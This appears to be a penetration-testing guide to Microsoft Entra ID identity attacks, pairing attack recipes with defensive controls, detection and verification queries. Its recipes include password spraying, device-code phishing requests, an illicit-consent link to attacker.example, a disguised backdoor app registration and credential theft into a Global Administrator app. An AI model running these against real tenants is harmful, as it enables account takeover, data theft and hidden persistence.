# Entra ID and Identity Attacks

> [!CAUTION]
> This file is for authorized security testing of Azure subscriptions and tenants you own or have explicit written permission to assess. Do not use these techniques against subscriptions, tenants, or services you do not own or have permission to test.

## 1. Overview

Microsoft Entra ID (formerly Azure Active Directory) is the identity provider for every Microsoft cloud service and for thousands of third-party applications. It is a multi-tenant directory: each organization has its own tenant, identified by a tenant ID (a GUID) and one or more verified domains (`<name>.onmicrosoft.com` plus any custom domain).

The principal types in Entra ID are:

- **Users** - human identities, either cloud-only or synchronized from on-premises Active Directory through Entra Connect.
- **Groups** - security groups and Microsoft 365 groups. A group can be assigned a role, and every member inherits it.
- **Service principals** - the local representation of an application in a tenant. Created when an application is registered in the tenant or when an enterprise application is consented to.
- **App registrations** - the application definition in the tenant where it was created. Holds redirect URIs, API permissions, and credentials.
- **Managed identities** - a service principal that has no credentials to manage, tied to an Azure resource (system-assigned) or to a standalone resource (user-assigned).

The authentication surface is equally broad:

- **Interactive** - username/password with MFA, passwordless (FIDO2, Windows Hello, Authenticator), and device code flow.
- **Non-interactive** - OAuth 2.0 client credentials (service principal with secret or certificate), ROPC (resource owner password credentials, legacy), and OBO (on-behalf-of).
- **Federated** - SAML 2.0 and OIDC with an external identity provider, including workload identity federation for CI/CD.

The tokens Entra ID issues are the primary target of an identity attack:

- **Access token** - a JWT, valid for a specific resource (`https://graph.microsoft.com`, `https://management.azure.com`, `https://vault.azure.net`), typically one hour.
- **Refresh token** - a long-lived credential that exchanges for new access tokens, valid until revoked or until a Conditional Access policy requires re-authentication.
- **ID token** - a JWT with claims about the authenticated user, used by the client, not for API access.
- **Primary Refresh Token (PRT)** - a device-bound credential issued to a registered device, used by SSO. The PRT is the most valuable token in an Entra ID environment because it survives password changes.

This file covers the identity attack surface: how tokens are stolen, how applications are abused, how directory roles are escalated, and how the defensive controls (Conditional Access, PIM, consent policy) are configured.

## 2. Reconnaissance / Enumeration

### 2.1 Unauthenticated tenant reconnaissance

Some tenant metadata is available without credentials:

```bash
# Tenant ID for a verified domain (openid-configuration endpoint)
curl -s "https://login.microsoftonline.com/<domain>/v2.0/.well-known/openid-configuration" | jq '.issuer'

# Tenant ID via the GetUserRealm endpoint (also reveals AuthN type: Managed or Federated)
curl -s "https://login.microsoftonline.com/getuserrealm.srf?login=user@<domain>&json=1"
```

The `NameSpaceType` field in the realm response is either `Managed` (cloud-only or password-hash-sync) or `Federated` (ADFS or another SAML IdP). A federated tenant exposes the ADFS endpoint, which is often on the public internet and is a separate attack surface.

### 2.2 Authenticated enumeration

With any valid token for Microsoft Graph, the directory is enumerable to the extent the token's scopes allow:

```bash
# Users, groups, service principals
az ad user list --output table
az ad group list --output table
az ad sp list --all --output table

# Applications and their credentials
az ad app list --all --query '[].{Name:displayName,AppId:appId,PasswordCredentials:passwordCredentials,KeyCredentials:keyCredentials}' --output table

# Directory roles and their members
az rest --method GET --url 'https://graph.microsoft.com/v1.0/directoryRoles' --query 'value[].{Name:displayName,Id:id}'
az rest --method GET --url 'https://graph.microsoft.com/v1.0/directoryRoles/<role-id>/members' --query 'value[].{Name:displayName,Id:id}'

# Conditional Access policies (requires Policy.Read.All)
az rest --method GET --url 'https://graph.microsoft.com/v1.0/identity/conditionalAccess/policies'
```

### 2.3 Consent and permissions review

Two Graph permissions are the most valuable for an attacker:

- `Application.ReadWrite.All` - create a new app registration, add a client secret, and use it as a persistence mechanism.
- `RoleManagement.ReadWrite.Directory` - assign a directory role to any principal, including the attacker's own app.

The current identity's effective Graph permissions are visible in the token itself:

```bash
# Decode the access token payload (base64url middle segment)
TOKEN="<access-token>"
echo "$TOKEN" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | jq '.scp, .roles'
```

The `scp` claim lists delegated scopes; the `roles` claim lists application permissions. An application permission (`roles`) is more powerful than a delegated scope because it runs without a user context.

## 3. Common Attack Vectors

### 3.1 Password spray against the tenant

Entra ID has a default lockout threshold that is often not tuned per tenant, and it enforces a smart lockout that distinguishes familiar and unfamiliar locations. A password spray sends one or two passwords per account, spaced out, to avoid tripping the threshold.

The most common patterns: `<Season><Year>!`, `<Company><Year>!`, `<Month><Year>!`. These are guesses against human behavior, not against Entra ID itself. MFA is the only durable defense; a spray without MFA is a full compromise.

### 3.2 Token theft from endpoints

Tokens live in the browser (session cookies, localStorage), in the Microsoft Office client (refresh tokens), and in the OS (PRT). The theft paths:

- **Infostealer malware** on an endpoint reads the browser's token cache and the Office token cache.
- **Adversary-in-the-middle (AiTM)** phishing proxies the login flow (Evilginx, Modlishka) and steals the session cookie after MFA succeeds. The victim's MFA is satisfied against the real IdP; the proxy captures the resulting token.
- **Device code phishing** tricks the user into entering a code at `microsoft.com/devicelogin` on the attacker's behalf, which authenticates the attacker's session as the user.

### 3.3 Illicit consent grant

The attacker registers an app in their own tenant, requests delegated permissions (`Mail.Read`, `Files.ReadWrite.All`, `offline_access`), and sends a consent link. If the target consents, the attacker has a refresh token that acts as the user without ever knowing the password. This bypasses MFA because the user authenticates and then consents.

### 3.4 Application credential abuse

An app registration holds client secrets and certificates. If a secret leaks (repository, CI log, screenshot), the attacker authenticates as the service principal and inherits every permission the app has on the tenant.

### 3.5 Federated identity credential abuse

A federated identity credential (FIC) on an app registration trusts an external OIDC issuer. If an attacker can add a FIC to an app, they can obtain tokens for that app from their own issuer without ever holding a secret. This is a persistence mechanism that survives secret rotation.

### 3.6 Privilege escalation via directory roles

Several directory roles are de facto tenant-admin equivalents:

- **`Privileged Role Administrator`** - can assign any role to any principal, including `Global Administrator`.
- **`Privileged Authentication Administrator`** - can reset the password of any user, including other administrators.
- **`Application Administrator`** / **`Cloud Application Administrator`** - can add credentials to any app registration, which is a persistence path to every permission the app holds.
- **`User Administrator`** - can reset passwords for non-admin users, which is enough to pivot into any user's mailbox.
- **`Authentication Administrator`** - can reset MFA methods for non-admin users.

### 3.7 On-premises sync abuse

If Entra Connect is installed, a compromised on-premises Active Directory can modify synchronized identities. `MSOL_*` accounts (created by Entra Connect) hold the `Directory Synchronization Accounts` role and can write to directory objects. An attacker who controls the on-prem AD can backdoor any synchronized user, including a `Global Administrator`.

## 4. Exploitation Recipes

### 4.1 Password spray with a single password

Precondition: a list of tenant users (enumerable from `getuserrealm.srf` or from any authenticated `User.Read.All` call), and a low-and-slow spray policy to avoid tripping smart lockout. The tool below is intentionally minimal; in real engagements, use a spray tool with per-account delay and stop-on-success.

```bash
# One password, many users, spaced out.
# The tool: MSOLSpray (PowerShell) or o365spray (Python)
o365spray --spray --domain example.com --userlist users.txt --password 'Spring2026!' --delay 30 --jitter 15
```

Expected output: the tool reports any valid pair (`user:password`) and stops on the first hit. A tenant with MFA enforced returns `AADSTS50076` (MFA required) for a valid password, which is itself a finding: the password is correct, MFA is the only remaining barrier.

### 4.2 Device code phishing

Precondition: an attacker-controlled client that can request a device code from Entra ID, and a target user who will enter the code at `microsoft.com/devicelogin`.

```bash
# Step 1: request a device code (attacker side)
# The client ID is any public client registered in Entra ID, including Microsoft's
# first-party clients (e.g. the Microsoft Authentication Library, or the Azure CLI)
curl -s -X POST "https://login.microsoftonline.com/common/oauth2/v2.0/devicecode" \
    -d "client_id=04b07795-8ddb-461a-bbee-02f9e1bf7b46" \
    -d "scope=https://graph.microsoft.com/.default offline_access"
```

The response contains a `user_code` and a `verification_uri`. The attacker sends the code to the victim ("enter this code to fix your account"). When the victim enters it, the attacker polls:

```bash
# Step 2: poll for the token (attacker side)
curl -s -X POST "https://login.microsoftonline.com/common/oauth2/v2.0/token" \
    -d "grant_type=urn:ietf:params:oauth:grant-type:device_code" \
    -d "client_id=04b07795-8ddb-461a-bbee-02f9e1bf7b46" \
    -d "device_code=<device_code>"
```

The response contains `access_token` and `refresh_token` for the victim. No MFA prompt is shown to the attacker; the victim satisfied MFA on their own device.

### 4.3 Illicit consent grant

Precondition: an attacker-controlled tenant, an app registration in that tenant, and a target user who is allowed to consent.

```bash
# Consent URL (attacker sends this to the victim)
# <attacker-tenant> is the attacker's tenant ID; <app-id> is the attacker's app
https://login.microsoftonline.com/<attacker-tenant>/oauth2/v2.0/authorize?client_id=<app-id>&response_type=code&redirect_uri=https://attacker.example/callback&scope=https://graph.microsoft.com/Mail.Read https://graph.microsoft.com/Files.ReadWrite.All https://graph.microsoft.com/offline_access&state=state123
```

When the victim clicks the link and consents, Entra ID redirects to `https://attacker.example/callback?code=<authorization-code>`. The attacker exchanges the code for tokens:

```bash
curl -s -X POST "https://login.microsoftonline.com/<attacker-tenant>/oauth2/v2.0/token" \
    -d "client_id=<app-id>" \
    -d "client_secret=<app-secret>" \
    -d "grant_type=authorization_code" \
    -d "code=<authorization-code>" \
    -d "redirect_uri=https://attacker.example/callback"
```

Expected output:

```json
{
  "token_type": "Bearer",
  "scope": "Mail.Read Files.ReadWrite.All offline_access",
  "expires_in": 3599,
  "access_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIs...",
  "refresh_token": "0.ARwA6Wg..."
}
```

The refresh token is valid until revoked or until a Conditional Access policy forces re-authentication. It can be used to read the victim's mail and files indefinitely, and it survives a password change.

### 4.4 App registration persistence via a new client secret

Precondition: the current identity has `Application.ReadWrite.All` (or `Application.ReadWrite.OwnedBy` on the target app). The attacker creates a new app registration, adds a secret, and assigns it a role on a subscription.

```bash
# Create a new app registration
APP_ID=$(az ad app create --display-name "Azure Monitor Reader" --query appId -o tsv)

# Create a service principal for the app
az ad sp create --id "$APP_ID"

# Add a client secret valid for 2 years
SECRET=$(az ad app credential reset --id "$APP_ID" --years 2 --query password -o tsv)

# Assign Reader on the subscription (requires Owner or User Access Administrator)
az role assignment create --assignee "$APP_ID" --role Reader --scope "/subscriptions/<subscription-id>"

echo "App ID: $APP_ID"
echo "Secret: $SECRET"
```

The app is now a durable backdoor. It appears in the app registrations list as "Azure Monitor Reader", and its secret is valid for two years.

### 4.5 Privilege escalation via `Application Administrator`

Precondition: the current identity holds the `Application Administrator` directory role. The role can add credentials to any app registration, including one that holds a `Global Administrator` directory role.

```bash
# Find an app registration that holds a privileged role
APP_ID=$(az rest --method GET --url 'https://graph.microsoft.com/v1.0/directoryRoles' --query "value[?displayName=='Global Administrator'].id" -o tsv | head -1)
PRIVILEGED_APP=$(az rest --method GET --url "https://graph.microsoft.com/v1.0/directoryRoles/$APP_ID/members" --query 'value[].{AppId:appId,Id:id}' -o tsv | head -1)

# Add a credential to it
az ad app credential reset --id "$PRIVILEGED_APP" --years 1
```

The attacker now holds a credential for an app that has `Global Administrator`. No password reset, no MFA prompt, no user interaction.

## 5. Post-Exploitation

After obtaining an Entra ID token or a privileged role, the attacker's priorities are persistence, privilege escalation, and data access.

- **Persistence via app registration:** a new app with a client secret, a certificate, or a federated identity credential, plus a role assignment on a subscription. Survives password resets and MFA changes.
- **Persistence via a new user:** create a cloud-only user with the `Global Administrator` role (or a lesser role for stealth), and add it to the directory.
- **Persistence via a device:** register an attacker-controlled device with a PRT, which survives password changes.
- **Privilege escalation:** `Application Administrator` → app credential → `Global Administrator` (4.5); `Privileged Authentication Administrator` → password reset of a `Global Administrator`; `User Administrator` → password reset of a non-admin user with mailbox access.
- **Data access:** `Mail.Read`, `Files.ReadWrite.All`, `Sites.ReadWrite.All`, `Chat.Read` for Microsoft 365; `Directory.Read.All` for the tenant graph; `Key Vault` secrets via the Azure Resource Manager API if the identity has the right RBAC role.

## 6. Preventive Controls

- **Enforce MFA for every user, without exceptions.** Number-matching MFA for all, and phishing-resistant MFA (FIDO2, Windows Hello, certificate-based) for every administrative role. Disable legacy authentication at the tenant level.
- **Block device code flow** for users who do not need it. Conditional Access policy: `Authentication flows` → `Device code flow` → `Block`.
- **Restrict user consent.** Set the tenant consent policy to `Do not allow user consent` or `Allow user consent for apps from verified publishers, for selected permissions (low impact)`. Add a "risky app consent" admin approval flow.
- **Use PIM for all administrative roles.** No standing `Global Administrator`. Activation requires MFA, approval, and a justification, and the assignment is time-bounded.
- **Monitor and remove unused app registrations and service principals.** `Application.ReadWrite.All` in the wrong hands is tenant persistence; every app is a potential backdoor.
- **Enable Conditional Access for risky sign-ins.** Require compliant or hybrid-joined devices for administrative roles, block sign-ins from anonymous IPs, require re-authentication for risky sign-ins.
- **Protect the on-premises AD.** Entra Connect's `MSOL_*` account is a `Directory Synchronization Accounts` role holder; a compromised AD can backdoor any synchronized user.

## 7. Detection Controls

The primary logs are the **Entra ID sign-in logs** and the **Entra ID audit logs**. Both are available in Log Analytics through Microsoft Sentinel, and in the Entra admin center for interactive review.

- **Sign-in logs** - alert on: sign-ins from new countries or anonymous IPs, impossible travel, legacy authentication, a successful sign-in with a `riskySignIn` flag from Identity Protection, a sign-in to `Microsoft Authentication Broker` (a device-code indicator), a sign-in with `Device Code Flow` as the authentication method, a successful sign-in from a new device with no MFA.
- **Audit logs** - alert on: `Add service principal credentials` (new secret), `Add federated identity credentials`, `Add app role assignment`, `Add member to role`, `Add owner to application`, `Consent to application`, `Add OAuth2PermissionGrant`.
- **Microsoft Defender for Cloud Apps** - anomaly detection for mailbox and file access, and OAuth app governance (which apps have which permissions, which apps are unused, which apps have been flagged as risky).
- **Microsoft Defender for Identity** (on-prem AD) and **Microsoft Defender for Endpoint** (endpoint) - the two sources that detect the on-prem and endpoint side of the attack chain.

## 8. Verification

Read-only checks to confirm the preventive controls are in place:

```bash
# Users without MFA (a list, not a guarantee: MFA state is in the authentication methods report)
az rest --method GET --url 'https://graph.microsoft.com/v1.0/reports/authenticationMethods/userRegistrationDetails'

# Standing Global Administrators
az rest --method GET --url 'https://graph.microsoft.com/v1.0/directoryRoles' --query "value[?displayName=='Global Administrator'].id" -o tsv | xargs -I{} az rest --method GET --url 'https://graph.microsoft.com/v1.0/directoryRoles/{}/members' --query 'value[].{Name:displayName,UserPrincipalName:userPrincipalName}'

# App registrations with credentials older than 90 days
az ad app list --all --query "[?passwordCredentials[?endDateTime < '2027-01-01']].{Name:displayName,AppId:appId,SecretEnd:passwordCredentials[].endDateTime}"

# Federated identity credentials on app registrations
az ad app list --all --query "[?federatedIdentityCredentials[0]].{Name:displayName,AppId:appId,FICs:federatedIdentityCredentials[].issuer}"

# Conditional Access policies that target administrative roles
az rest --method GET --url 'https://graph.microsoft.com/v1.0/identity/conditionalAccess/policies' --query "value[?contains(to_string(conditions.users.includeRoles), 'Global Administrator')].{Name:displayName,State:state}"
```

Expected result: no standing `Global Administrator` except break-glass, no app with a secret or certificate older than 90 days, no federated identity credential on an app that does not need one, and at least one enabled Conditional Access policy that targets the administrative roles.

## 9. Certification Alignment

- **Microsoft Certified: Azure Security Engineer Associate (AZ-500)** - identity and access management, Conditional Access, PIM, application security, token protection.
- **Microsoft Certified: Identity and Access Administrator Associate (SC-300)** - the primary certification for this file. Entra ID, authentication, authorization, application management, monitoring.
- **Microsoft Certified: Security Operations Analyst Associate (SC-200)** - Microsoft Sentinel and Defender XDR detection.
- **CompTIA Security+** - identity and access management, authentication factors, federated identity.

## 10. Production Notes

- Access tokens are short-lived (around one hour) but refresh tokens are long-lived (up to 90 days, sliding). A stolen refresh token is equivalent to a stolen password that survives a password change.
- The Primary Refresh Token (PRT) is device-bound and is the strongest token in the tenant. Protect device registration with Conditional Access, and revoke device registration as part of incident response.
- Conditional Access evaluates at sign-in, not on every request. A token issued before a policy change remains valid until it expires; use Continuous Access Evaluation (CAE) for near-real-time enforcement.
- `Global Administrator` is not the only tenant-wide role. `Privileged Role Administrator`, `Application Administrator`, and `Privileged Authentication Administrator` are equally dangerous. Monitor all of them.
- Entra Connect's `MSOL_*` account is a `Directory Synchronization Accounts` role holder. Treat it as a Tier-0 credential.

## 11. References

- Microsoft Entra ID documentation - https://learn.microsoft.com/en-us/entra/
- Microsoft Entra ID protection - https://learn.microsoft.com/en-us/entra/id-protection/
- Conditional Access documentation - https://learn.microsoft.com/en-us/entra/identity/conditional-access/
- Privileged Identity Management - https://learn.microsoft.com/en-us/entra/id-governance/privileged-identity-management/
- Microsoft Graph API - https://learn.microsoft.com/en-us/graph/
- Microsoft Defender for Cloud Apps - https://learn.microsoft.com/en-us/defender-cloud-apps/
- Microsoft Sentinel - https://learn.microsoft.com/en-us/azure/sentinel/
